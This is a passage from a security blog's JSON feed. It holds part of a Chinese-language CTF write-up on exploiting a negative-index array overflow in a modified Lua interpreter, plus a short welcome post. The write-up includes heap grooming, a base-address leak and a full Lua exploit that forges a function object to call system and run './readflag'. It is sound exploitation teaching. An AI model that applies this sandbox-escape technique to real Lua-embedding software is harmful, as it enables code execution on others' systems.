luaB_print</span><br><span class=\"line\">b exit</span><br><span class=\"line\">c</span><br></pre></td></tr></table></figure>\n\n<p>这样就可以在进入 luaB_print 和 exit 时候各看一次数组的变化，来判断出存在什么漏洞</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/9c57c3fa3ea70c1d909dcb8bab284400.png\" alt=\"9c57c3fa3ea70c1d909dcb8bab284400\"></p>\n<p>直接数据搜索可以看到列表是存在于堆块上的，接下来继续走会 crash</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/0752fdb4b1d40ad324d14d420a58f538.png\" alt=\"0752fdb4b1d40ad324d14d420a58f538\"></p>\n<p>并且被写上去了，所以到这里就确定漏洞是数组的负向溢出写</p>\n<p>由于一些功能被禁用了，所以没有办法直接泄露出地址，如果要通过堆，那么就需要一个稳定的堆布局</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/fb3567e5c69c41e00a0ed78f798e3216.png\" alt=\"fb3567e5c69c41e00a0ed78f798e3216\"></p>\n<p>需要把堆都申请下，这里如果调试会发现，字符串也是放在堆块上的，并且申请的堆块大小是 字符串大小 + 0x28</p>\n<p>有了稳定的堆布局之后，就可以进行堆地址泄露</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/9179f62fdb0d1122acfe5bc90a4e8e96.png\"></p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">local</span> ptr_a = <span class=\"built_in\">string</span>.<span class=\"built_in\">rep</span>(<span class=\"string\">&#x27;e&#x27;</span>, <span class=\"number\">0x100</span>)</span><br><span class=\"line\"><span class=\"keyword\">local</span> ptr_b = &#123;<span class=\"number\">0x11223344</span>, <span class=\"number\">0x2</span>, <span class=\"number\">0x3</span>, <span class=\"number\">0x4</span>, <span class=\"number\">0x5</span>, <span class=\"number\">0x6</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ptr_b[<span class=\"number\">-10</span>] = <span class=\"built_in\">print</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">local</span> pro_base = u64(<span class=\"built_in\">string</span>.<span class=\"built_in\">sub</span>(ptr_a, <span class=\"number\">0x68</span>, <span class=\"number\">0x80</span>)) - <span class=\"number\">0x376d4</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;pro_base -&gt; &quot;</span>, intToHex(pro_base))</span><br><span class=\"line\"><span class=\"keyword\">local</span> ste = pro_base + <span class=\"number\">0x3a2dd</span></span><br><span class=\"line\"><span class=\"keyword\">local</span> pr = pro_base + <span class=\"number\">0x376d4</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;system -&gt; &quot;</span>, intToHex(ste))</span><br></pre></td></tr></table></figure>\n\n<p>我一开始用两个列表，但是 print 时候一直报错</p>\n<p>这样就获得了程序基址，接着就可以直接调用了</p>\n<p>这是一个直接调用的 poc</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local ptr_a = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ptr_a[<span class=\"number\">1</span>] = <span class=\"built_in\">print</span></span><br><span class=\"line\">ptr_a[<span class=\"number\">2</span>] = <span class=\"number\">0x11223344</span></span><br><span class=\"line\">ptr_a[<span class=\"number\">3</span>] = <span class=\"number\">3</span></span><br><span class=\"line\">ptr_a[<span class=\"number\">4</span>] = <span class=\"number\">4</span></span><br><span class=\"line\">ptr_a[<span class=\"number\">5</span>] = <span class=\"number\">5</span></span><br><span class=\"line\">ptr_a[<span class=\"number\">6</span>] = <span class=\"number\">6</span></span><br><span class=\"line\"></span><br><span class=\"line\">(ptr_a[<span class=\"number\">1</span>])(ptr_a[<span class=\"number\">2</span>])</span><br></pre></td></tr></table></figure>\n\n<p>由于某些功能被禁用了，所以要调用 system 的话，得通过负向溢出调用伪造的数组</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/43a53b8c927b2dce40197caeafa198bf.png\" alt=\"43a53b8c927b2dce40197caeafa198bf\"></p>\n<p>调试发现的话，print 是 函数地址 + p8(0X16) , 而单纯数据的话，就是 value + p8(0x3)</p>\n<p>exp</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">intToHex</span><span class=\"params\">(number)</span></span></span><br><span class=\"line\">    <span class=\"keyword\">local</span> hexDigits = <span class=\"string\">&quot;0123456789ABCDEF&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">local</span> hexString = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span> number &gt; <span class=\"number\">0</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">        <span class=\"keyword\">local</span> digit = number % <span class=\"number\">16</span></span><br><span class=\"line\">        hexString = hexDigits:<span class=\"built_in\">sub</span>(digit + <span class=\"number\">1</span>, digit + <span class=\"number\">1</span>) .. hexString</span><br><span class=\"line\">        number = <span class=\"built_in\">math</span>.<span class=\"built_in\">floor</span>(number / <span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"keyword\">end</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> hexString</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">u64</span><span class=\"params\">(s)</span></span> </span><br><span class=\"line\">\t<span class=\"keyword\">local</span> result = <span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i= <span class=\"number\">8</span>, <span class=\"number\">2</span>, <span class=\"number\">-1</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">local</span> num = <span class=\"built_in\">string</span>.<span class=\"built_in\">byte</span>(<span class=\"built_in\">string</span>.<span class=\"built_in\">sub</span>(s,i,i+<span class=\"number\">1</span>))</span><br><span class=\"line\">\t\tresult = (result &lt;&lt; <span class=\"number\">8</span>) + num</span><br><span class=\"line\">\t<span class=\"keyword\">end</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> result</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">p64</span><span class=\"params\">(d)</span></span></span><br><span class=\"line\">\t<span class=\"keyword\">local</span> s = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i = <span class=\"number\">0</span>, <span class=\"number\">7</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\ts = s .. <span class=\"built_in\">string</span>.<span class=\"built_in\">char</span>((d &gt;&gt; (i * <span class=\"number\">8</span>)) &amp; <span class=\"number\">0xff</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">end</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> s;</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- step 1 : set heap</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">local</span> command = <span class=\"string\">&quot;./readflag&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">local</span> heap = &#123;&#125;</span><br><span class=\"line\">count = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i = <span class=\"number\">0x10</span>, <span class=\"number\">0x500</span>, <span class=\"number\">0x10</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j=<span class=\"number\">1</span>, <span class=\"number\">8</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\theap[count] = <span class=\"built_in\">string</span>.<span class=\"built_in\">rep</span>(<span class=\"string\">&#x27;a&#x27;</span>, i)</span><br><span class=\"line\">\t\tcount = count + <span class=\"number\">1</span></span><br><span class=\"line\">\t<span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- step 2 : leak pro_base</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">local</span> ptr_a = <span class=\"built_in\">string</span>.<span class=\"built_in\">rep</span>(<span class=\"string\">&#x27;e&#x27;</span>, <span class=\"number\">0x100</span>)</span><br><span class=\"line\"><span class=\"keyword\">local</span> ptr_b = &#123;<span class=\"number\">0x11223344</span>, <span class=\"number\">0x2</span>, <span class=\"number\">0x3</span>, <span class=\"number\">0x4</span>, <span class=\"number\">0x5</span>, <span class=\"number\">0x6</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ptr_b[<span class=\"number\">-10</span>] = <span class=\"built_in\">print</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">local</span> pro_base = u64(<span class=\"built_in\">string</span>.<span class=\"built_in\">sub</span>(ptr_a, <span class=\"number\">0x68</span>, <span class=\"number\">0x80</span>)) - <span class=\"number\">0x376d4</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;pro_base -&gt; &quot;</span>, intToHex(pro_base))</span><br><span class=\"line\"><span class=\"keyword\">local</span> ste = pro_base + <span class=\"number\">0x3a2dd</span></span><br><span class=\"line\"><span class=\"keyword\">local</span> pr = pro_base + <span class=\"number\">0x376d4</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;system -&gt; &quot;</span>, intToHex(ste))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- step 3 : run os_execute</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">local</span> ptr_c = p64(<span class=\"number\">0</span>) .. p64(<span class=\"number\">0x1111</span>)</span><br><span class=\"line\">\t.. p64(<span class=\"number\">0</span>) .. p64(<span class=\"number\">0x2222</span>) .. p64(<span class=\"number\">0</span>) .. p64(<span class=\"number\">0x3333</span>) .. p64(<span class=\"number\">0</span>) .. p64(ste) .. p64(<span class=\"number\">0x16</span>)</span><br><span class=\"line\"><span class=\"keyword\">local</span> ptr_d = &#123;<span class=\"number\">0x22334455</span>, <span class=\"number\">0x2</span>, <span class=\"number\">0x3</span>, <span class=\"number\">0x4</span>, <span class=\"number\">0x5</span>, <span class=\"number\">0x6</span>&#125;</span><br><span class=\"line\">(ptr_d[<span class=\"number\">-5</span>])(command)</span><br></pre></td></tr></table></figure>\n\n",
            "tags": [
                "mapna"
            ]
        },
        {
            "id": "http://example.com/2024/07/13/readme/",
            "url": "http://example.com/2024/07/13/readme/",
            "title": "欢迎来到我的新博客",
            "date_published": "2024-07-13T13:04:23.000Z",
            "content_html": "<p><strong>各位大佬好，我是 xsh，一名<del>二进制安全研究员</del>二进制菜狗，欢迎来到我的新博客</strong></p>\n<p><img src=\"/2024/07/13/readme/1308265773_233027cbd1e271924f052fd455f533b0.jpg\"></p>\n<p><img src=\"/2024/07/13/readme/ee68ea1fa0b9956f35ed3346382001b69c14c1358c18c1a7a.jpg\"></p>\n<p><img src=\"/2024/07/13/readme/h3.jpg\" alt=\"h3\"></p>\n",
            "tags": [
                "readme"
            ]
        }
    ]
}